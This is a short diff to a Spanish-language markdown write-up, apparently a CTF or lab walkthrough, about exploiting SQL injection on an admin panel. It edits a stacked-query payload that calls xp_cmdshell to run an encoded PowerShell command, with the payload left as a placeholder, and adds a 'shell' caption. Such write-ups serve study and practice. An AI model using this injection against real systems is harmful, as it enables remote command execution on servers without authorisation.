@@ -211,7 +211,11 @@ podemos encontrar `XSS` y `SQLi`  panel de administración, y sabemos que este e
 aprovecharemos `SQLI` para ejecutar nuestro payload
 
 ```python
-3'; use master; exec xp_cmdshell 'powershell -e t';-- -
+3'; use master; exec xp_cmdshell 'powershell -e TuPayloadAqui';-- -
 ```
 
 ![[Pasted image 20240705144840.png]]
+
+`shell`
+
+![[Pasted image 20240705145114.png]]
